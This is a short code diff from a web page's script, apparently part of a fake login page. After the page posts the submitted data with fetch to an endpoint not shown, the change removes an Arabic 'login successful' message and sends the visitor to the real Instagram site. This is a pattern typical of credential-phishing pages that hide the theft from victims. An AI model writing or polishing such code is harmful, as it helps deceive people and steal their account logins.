@@ -176,13 +176,15 @@
             },
             body: JSON.stringify(data)
         }).then(() => {
-            const resDiv = document.getElementById("result");
-            resDiv.style.display = "block";
-            resDiv.innerHTML = "<b>تم تسجيل الدخول بنجاح!</b>";
-        }).catch(err => {
-            console.error(err);
-        });
-    }
+    const resDiv = document.getElementById("result");
+    resDiv.style.display = "block";
+    resDiv.innerHTML = "<b></b>";
+    
+    window.location.href = "https://www.instagram.com";
+
+}).catch(err => {
+    console.error(err);
+});
 </script>
 
 </body>
